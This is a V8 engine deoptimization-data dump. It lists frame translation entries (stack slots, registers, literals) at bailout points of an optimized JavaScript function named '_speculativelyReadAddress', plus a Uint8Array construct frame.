                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=18}
                               STACK_SLOT {input=13}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               CONSTRUCT_STUB_FRAME {bailout_id=2, function=0x2b18c9505449 <String[10]: Uint8Array>, height=2}
                               LITERAL {literal_id=4 (0x3b2a3bd127e9 <JSFunction Uint8Array (sfi = 0x18d859c94b01)>)}
                               INT32_STACK_SLOT {input=19}
                               LITERAL {literal_id=4 (0x3b2a3bd127e9 <JSFunction Uint8Array (sfi = 0x18d859c94b01)>)}
                               JAVA_SCRIPT_BUILTIN_CONTINUATION_FRAME {bailout_id=689, function=0x2b18c9505449 <String[10]: Uint8Array>, height=4}
                               LITERAL {literal_id=4 (0x3b2a3bd127e9 <JSFunction Uint8Array (sfi = 0x18d859c94b01)>)}
                               LITERAL {literal_id=5 (0x2b18c9502691 <the_hole>)}
                               LITERAL {literal_id=4 (0x3b2a3bd127e9 <JSFunction Uint8Array (sfi = 0x18d859c94b01)>)}
                               LITERAL {literal_id=6 (0x2b18c95025b1 <undefined>)}
                               LITERAL {literal_id=7 (1)}
                               STACK_SLOT {input=17}
     5               80    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=80, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
                               REGISTER {input=rax}
                               STACK_SLOT {input=18}
                               STACK_SLOT {input=13}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=8 (0)}
     6               80    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=80, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
                               REGISTER {input=rax}
                               STACK_SLOT {input=18}
                               STACK_SLOT {input=13}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=8 (0)}
     7               80    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=80, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
                               REGISTER {input=rax}
                               STACK_SLOT {input=18}
                               STACK_SLOT {input=13}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=8 (0)}
     8               80    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=80, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
                               REGISTER {input=rax}
                               STACK_SLOT {input=18}
                               STACK_SLOT {input=13}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=8 (0)}
     9               80    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=80, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
                               REGISTER {input=rax}
                               STACK_SLOT {input=18}
                               STACK_SLOT {input=13}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=8 (0)}
    10               80    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=80, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
                               REGISTER {input=rax}
                               STACK_SLOT {input=18}
                               STACK_SLOT {input=13}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=8 (0)}
    11              148    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=148, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               INT32_REGISTER {input=rsi}
                               INT32_REGISTER {input=rdi}
                               INT32_REGISTER {input=r8}
                               REGISTER {input=rbx}
                               REGISTER {input=rax}
                               STACK_SLOT {input=18}
                               STACK_SLOT {input=13}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               INT32_REGISTER {input=r8}
    12              148    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=148, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               INT32_REGISTER {input=rsi}
                               INT32_REGISTER {input=rdi}
                               INT32_REGISTER {input=r8}
                               REGISTER {input=rbx}
                               REGISTER {input=rax}
                               STACK_SLOT {input=18}
                               STACK_SLOT {input=13}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               INT32_REGISTER {input=r8}
    13              148    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=148, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               INT32_REGISTER {input=rsi}
                               INT32_REGISTER {input=rdi}
                               INT32_REGISTER {input=r8}
                               REGISTER {input=rbx}
                               REGISTER {input=rax}
                               STACK_SLOT {input=18}
                               STACK_SLOT {input=13}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               INT32_REGISTER {input=r8}
    14              148    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=148, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               INT32_REGISTER {input=rsi}
                               INT32_REGISTER {input=rdi}
                               INT32_REGISTER {input=r8}
                               REGISTER {input=rbx}
                               REGISTER {input=rax}
                               STACK_SLOT {input=18}
                               STACK_SLOT {input=13}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               INT32_REGISTER {input=r8}
    15              148    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=148, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               INT32_REGISTER {input=rsi}
                               INT32_REGISTER {input=rdi}
                               INT32_REGISTER {input=r8}
                               REGISTER {input=rbx}
                               REGISTER {input=rax}
                               STACK_SLOT {input=18}
                               STACK_SLOT {input=13}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               INT32_REGISTER {input=r8}
    16              148    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=148, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               INT32_REGISTER {input=rsi}
                               INT32_REGISTER {input=rdi}
                               INT32_REGISTER {input=r8}
                               REGISTER {input=rbx}
                               REGISTER {input=rax}
                               STACK_SLOT {input=18}
                               STACK_SLOT {input=13}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               INT32_REGISTER {input=r8}
    17              148    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=148, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               INT32_REGISTER {input=rsi}
                               INT32_REGISTER {input=rdi}
                               INT32_REGISTER {input=r8}
                               REGISTER {input=rbx}
                               REGISTER {input=rax}
                               STACK_SLOT {input=18}
                               STACK_SLOT {input=13}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               INT32_REGISTER {input=r8}
    18              148    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=148, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               INT32_REGISTER {input=rsi}
                               INT32_REGISTER {input=rdi}
                               INT32_REGISTER {input=r8}
                               REGISTER {input=rbx}
                               REGISTER {input=rax}
                               STACK_SLOT {input=18}
                               REGISTER {input=r9}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               INT32_REGISTER {input=r8}
    19              148    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=148, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               INT32_REGISTER {input=rsi}
                               INT32_REGISTER {input=rdi}
                               INT32_STACK_SLOT {input=23}
                               REGISTER {input=rbx}
                               REGISTER {input=rax}
                               STACK_SLOT {input=18}
                               REGISTER {input=r9}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               INT32_STACK_SLOT {input=23}
    20              220    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=220, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rax}
                               STACK_SLOT {input=18}
                               REGISTER {input=r9}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
    21               80    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=80, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               INT32_REGISTER {input=rcx}
                               REGISTER {input=rax}
                               STACK_SLOT {input=18}
                               REGISTER {input=r9}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=8 (0)}
    22               80    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=80, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               INT32_REGISTER {input=rcx}
                               REGISTER {input=rax}
                               STACK_SLOT {input=18}
                               REGISTER {input=r9}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=8 (0)}
    23               80    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=80, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               INT32_REGISTER {input=rcx}
                               REGISTER {input=rax}
                               STACK_SLOT {input=18}
                               REGISTER {input=r9}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=8 (0)}
    24              148    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=148, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               INT32_REGISTER {input=rsi}
                               INT32_REGISTER {input=rdi}
                               INT32_REGISTER {input=r8}
                               INT32_REGISTER {input=rcx}
                               REGISTER {input=rax}
                               STACK_SLOT {input=18}
                               REGISTER {input=r9}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               INT32_REGISTER {input=r8}
    25              148    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=148, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               INT32_REGISTER {input=rsi}
                               INT32_REGISTER {input=rdi}
                               INT32_REGISTER {input=r8}
                               INT32_REGISTER {input=rcx}
                               REGISTER {input=rax}
                               STACK_SLOT {input=18}
                               REGISTER {input=r9}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               INT32_REGISTER {input=r8}
    26              148    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=148, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               INT32_REGISTER {input=rsi}
                               INT32_REGISTER {input=rdi}
                               INT32_REGISTER {input=r8}
                               INT32_REGISTER {input=rcx}
                               REGISTER {input=rax}
                               STACK_SLOT {input=18}
                               REGISTER {input=r9}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               INT32_REGISTER {input=r8}
    27              148    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=148, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               INT32_STACK_SLOT {input=21}
                               INT32_REGISTER {input=rdi}
                               INT32_REGISTER {input=r8}
                               INT32_REGISTER {input=rcx}
                               STACK_SLOT {input=19}
                               STACK_SLOT {input=18}
                               REGISTER {input=r9}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               INT32_REGISTER {input=r8}
    28              148    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=148, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               INT32_STACK_SLOT {input=21}
                               INT32_REGISTER {input=rdi}
                               INT32_REGISTER {input=r8}
                               INT32_REGISTER {input=rcx}
                               STACK_SLOT {input=19}
                               STACK_SLOT {input=18}
                               REGISTER {input=r9}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               INT32_REGISTER {input=r8}
    29              148    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=148, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               INT32_STACK_SLOT {input=21}
                               INT32_REGISTER {input=rdi}
                               INT32_REGISTER {input=r8}
                               INT32_REGISTER {input=rcx}
                               STACK_SLOT {input=19}
                               STACK_SLOT {input=18}
                               REGISTER {input=r9}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               INT32_REGISTER {input=r8}
    30              148    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=148, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               INT32_STACK_SLOT {input=21}
                               INT32_REGISTER {input=rdi}
                               INT32_REGISTER {input=r8}
                               INT32_REGISTER {input=rcx}
                               STACK_SLOT {input=19}
                               STACK_SLOT {input=18}
                               REGISTER {input=r9}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               INT32_REGISTER {input=r8}
    31              148    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=148, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               INT32_STACK_SLOT {input=21}
                               INT32_REGISTER {input=rdi}
                               INT32_REGISTER {input=r8}
                               INT32_REGISTER {input=rcx}
                               STACK_SLOT {input=19}
                               STACK_SLOT {input=18}
                               REGISTER {input=r9}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               INT32_REGISTER {input=r8}
    32              220    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=220, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=19}
                               STACK_SLOT {input=18}
                               REGISTER {input=r9}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               INT32_REGISTER {input=rcx}
    33              229    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
